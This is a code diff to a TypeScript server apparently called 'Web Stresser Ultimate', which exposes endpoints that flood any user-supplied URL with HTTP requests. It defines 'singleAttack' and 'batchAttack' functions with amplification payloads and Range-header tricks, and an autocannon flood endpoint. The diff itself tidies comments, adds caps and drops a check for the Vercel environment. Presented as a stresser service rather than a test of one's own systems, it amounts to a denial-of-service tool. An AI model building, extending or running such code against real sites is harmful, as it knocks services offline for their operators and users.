@@ -2,7 +2,7 @@ import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
 import autocannon from 'autocannon';
 
-// Konfigurasi global agent untuk fetch
+// ==================== Konfigurasi global ====================
 const globalAgent = new Agent({
   connections: 100,
   pipelining: 1,
@@ -19,7 +19,7 @@ setInterval(() => {
   }
 }, 30000);
 
-// Helper functions
+// ==================== Helper functions ====================
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -34,7 +34,7 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   return randomString(size);
 }
 
-// Single attack (dipakai untuk SINGLE dan BATCH)
+// ==================== Single Attack ====================
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -70,7 +70,6 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
     ampPayload = generateAmplificationPayload(amplifyKB, amplifyType);
   }
 
-  // Modifikasi berdasarkan attack type
   switch (attackType) {
     case 'range':
       finalHeaders['Range'] = `bytes=0-${amplifyKB * 1024}`;
@@ -102,7 +101,6 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
       useBody = true;
   }
 
-  // Jika amplification dan method GET/HEAD besar, ubah ke POST
   if (amplifyEnabled && amplifyKB > 0 && (finalMethod === 'GET' || finalMethod === 'HEAD') && ampPayload.length > 2048) {
     finalMethod = 'POST';
     useBody = true;
@@ -171,7 +169,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// Batch attack (backend concurrency)
+// ==================== Batch Attack ====================
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -246,23 +244,36 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
   };
 }
 
-// AutoCannon attack (hanya berfungsi di environment yang mendukung, misal lokal)
-async function autocannonAttack(params: any): Promise<any> {
+// ==================== Autocannon Attack ====================
+interface AutocannonOptions {
+  url: string;
+  connections: number;
+  duration: number;
+  amount?: number;
+  method?: string;
+  headers?: Record<string, string>;
+  body?: string;
+}
+
+async function runAutocannon(options: AutocannonOptions): Promise<any> {
   return new Promise((resolve, reject) => {
-    const instance = autocannon({
-      url: params.url,
-      connections: Math.min(params.connections, 500),
-      duration: Math.min(params.duration, 10),
-      method: params.method,
-      headers: params.headers,
-      body: params.body,
-      amount: params.amount,
-      pipelining: 1,
-      reconnectRate: 0,
-    }, (err, result) => {
-      if (err) reject(err);
-      else resolve(result);
-    });
+    const instance = autocannon(
+      {
+        url: options.url,
+        connections: Math.min(options.connections, 100),
+        duration: Math.min(options.duration, 9),
+        amount: options.amount ? Math.min(options.amount, 5000) : undefined,
+        method: options.method || 'GET',
+        headers: options.headers,
+        body: options.body,
+        pipelining: 1,
+        reconnectRate: 0,
+      },
+      (err: any, result: any) => {
+        if (err) reject(err);
+        else resolve(result);
+      }
+    );
     autocannon.track(instance, { renderProgressBar: true });
   });
 }
@@ -277,8 +288,8 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia + AutoCannon',
-    version: '4.0.0',
+    message: 'Web Stresser Ultimate - Autocannon Edition',
+    version: '3.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -329,13 +340,8 @@ export const app = new Elysia()
     }),
   })
   .post('/api/autocannon', async ({ body }) => {
-    // AutoCannon hanya bisa berjalan di environment non-serverless (lokal)
-    // Cek apakah di Vercel (dengan env var) atau waktu terbatas
-    if (process.env.VERCEL) {
-      return { success: false, error: 'AutoCannon tidak tersedia di Vercel karena keterbatasan waktu eksekusi. Jalankan secara lokal.' };
-    }
     try {
-      const result = await autocannonAttack(body);
+      const result = await runAutocannon(body as AutocannonOptions);
       return { success: true, result };
     } catch (err: any) {
       return { success: false, error: err.message };
@@ -345,10 +351,10 @@ export const app = new Elysia()
       url: t.String(),
       connections: t.Number(),
       duration: t.Number(),
+      amount: t.Optional(t.Number()),
       method: t.Optional(t.String()),
       headers: t.Optional(t.Record(t.String(), t.String())),
       body: t.Optional(t.String()),
-      amount: t.Optional(t.Number()),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
